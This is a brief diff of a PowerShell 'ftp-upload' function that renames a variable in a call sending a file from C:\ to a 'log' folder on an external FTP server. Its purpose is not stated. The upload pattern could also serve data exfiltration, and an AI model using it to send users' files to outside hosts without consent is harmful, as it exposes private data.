@@ -11,7 +11,7 @@ function ftp-upload {
         $webClient = New-Object System.Net.WebClient
         $webClient.Credentials = New-Object System.Net.NetworkCredential($ftpUsername, $ftpPassword)
         
-        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $fileupload, "c:\" + $fileupload)
+        $webClient.UploadFile("ftp://ftp.zigflip.fun/log/" + $localFilePath, "c:\" + $localFilePath)
 
         Write-Host "Le fichier a été uploadé avec succès."
     }
